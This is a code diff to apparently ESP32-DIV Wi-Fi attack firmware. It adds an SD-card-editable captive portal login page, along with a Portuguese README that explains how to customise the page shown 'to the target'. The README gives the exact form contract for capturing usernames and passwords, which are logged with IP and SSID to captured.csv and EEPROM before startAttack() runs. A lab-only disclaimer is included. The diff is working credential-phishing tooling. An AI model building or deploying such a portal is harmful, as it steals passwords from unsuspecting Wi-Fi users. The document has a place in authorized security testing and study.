@@ -2984,6 +2984,123 @@ static bool cpAppendLineToFile(const char* path, const String& line) {
   return ok;
 }
 
+// --- SD-editable captive portal page -----------------------------------------
+// Mirrors the Beacon "/ssid_list.txt" pattern: the login page is seeded to the
+// SD card on first run (so there is a file to edit) and reloaded from there on
+// every run, falling back to the built-in page if the SD/file is unavailable.
+static const char* kCpPagePath   = "/captive_portal/login.html";
+static const char* kCpReadmePath = "/captive_portal/README.txt";
+
+static const char kCpReadmeText[] = R"RDME(ESP32-DIV - Captive Portal: pagina editavel
+===========================================================
+
+ARQUIVO DA PAGINA
+-----------------
+  /captive_portal/login.html
+
+Edite esse arquivo (qualquer editor de texto) para mudar a APARENCIA da
+pagina mostrada ao alvo. Ele foi criado automaticamente na primeira vez, com
+a pagina padrao, so para voce ter um ponto de partida.
+
+- Mexa a vontade no HTML/CSS: cores, textos, layout, logo (imagem em base64
+  embutida funciona, sem depender de internet).
+- Se o arquivo faltar, estiver vazio ou o SD nao montar, o firmware usa a
+  pagina embutida (fallback). Nada quebra.
+- Salve e recoloque o cartao. Nao precisa recompilar nada.
+
+CONTRATO OBRIGATORIO (para os dados digitados serem registrados)
+----------------------------------------------------------------
+O firmware so captura o que for enviado EXATAMENTE assim:
+
+  1. Formulario que faz POST para /login :
+        <form action='/login' method='POST'> ... </form>
+  2. Campo de senha com name="password" :
+        <input type='password' name='password'>
+  3. (Opcional) campo de usuario com name="username" :
+        <input type='text' name='username'>
+  4. Um submit dentro do form:
+        <button type='submit'>Entrar</button>
+
+Se voce renomear os campos (ex.: name='senha') ou mudar o action, o dado
+NAO sera registrado. Os nomes username/password e o action /login sao fixos
+no firmware.
+
+ONDE OS DADOS FICAM
+-------------------
+Cada envio e gravado em:
+  /captive_portal/captured.csv
+Colunas: millis,remote_ip,ssid,username,password
+(Tambem salvos na EEPROM, exportaveis pela tela do aparelho.)
+
+EXEMPLO MINIMO QUE FUNCIONA
+---------------------------
+  <!DOCTYPE html><html><head><meta name='viewport'
+    content='width=device-width, initial-scale=1'></head><body>
+    <h1>Minha pagina</h1>
+    <form action='/login' method='POST'>
+      <input type='text' name='username' placeholder='Usuario'><br>
+      <input type='password' name='password' placeholder='Senha' required><br>
+      <button type='submit'>Entrar</button>
+    </form>
+  </body></html>
+
+USO AUTORIZADO
+--------------
+Apenas em laboratorio/equipamentos proprios ou com autorizacao explicita,
+para estudo e defesa. Nao use contra terceiros.
+)RDME";
+
+static bool cpWriteFileIfMissing(const char* path, const String& content) {
+  if (!cpMountSD()) return false;
+  if (SD.exists(path)) return true;          // never overwrite the user's edits
+  File f = SD.open(path, "w");
+  if (!f) {
+    cp_sd_mounted = false;
+    if (!cpMountSD()) return false;
+    f = SD.open(path, "w");
+    if (!f) return false;
+  }
+  f.print(content);
+  f.flush();
+  f.close();
+  return true;
+}
+
+// Seed login.html (with the current built-in page) and README.txt on first run.
+static void cpSeedPortalFilesOnSD() {
+  if (!cpEnsureDir("/captive_portal")) {
+    Serial.println("[SD] /captive_portal unavailable; built-in portal page");
+    return;
+  }
+  if (cpWriteFileIfMissing(kCpPagePath, loginPage)) {
+    Serial.printf("[SD] editable portal page at %s\n", kCpPagePath);
+  }
+  cpWriteFileIfMissing(kCpReadmePath, String(kCpReadmeText));
+}
+
+// Load the (possibly user-edited) page from SD into loginPage; fall back to the
+// built-in default on any problem.
+static void cpLoadLoginPageFromSD() {
+  if (!cpMountSD())            { Serial.println("[SD] not mounted; built-in portal page"); return; }
+  if (!SD.exists(kCpPagePath)) { Serial.println("[SD] login.html missing; built-in portal page"); return; }
+  File f = SD.open(kCpPagePath, FILE_READ);
+  if (!f)                      { Serial.println("[SD] cannot open login.html; built-in portal page"); return; }
+
+  String html;
+  html.reserve(f.size() + 1);
+  while (f.available()) html += (char)f.read();
+  f.close();
+
+  if (html.length() < 20) {    // too small to be a real page -> keep default
+    Serial.println("[SD] login.html empty/too small; built-in portal page");
+    return;
+  }
+  loginPage = html;
+  Serial.printf("[SD] loaded portal page from %s (%u bytes)\n",
+                kCpPagePath, (unsigned)loginPage.length());
+  displayPrint("Portal page loaded from SD", GREEN, false);
+}
+
 static bool cpAppendCaptureToSD(const String& remoteIp, const String& username, const String& passwordStr, const String& ssid) {
   const char* dir = "/captive_portal";
   const char* path = "/captive_portal/captured.csv";
@@ -4162,6 +4279,10 @@ void cportalSetup() {
     EEPROM.commit();
   }
   loadSSID();
+
+  // Seed (first run) + load the SD-editable login page; falls back to built-in.
+  cpSeedPortalFilesOnSD();
+  cpLoadLoginPageFromSD();
 
   startAttack();
 
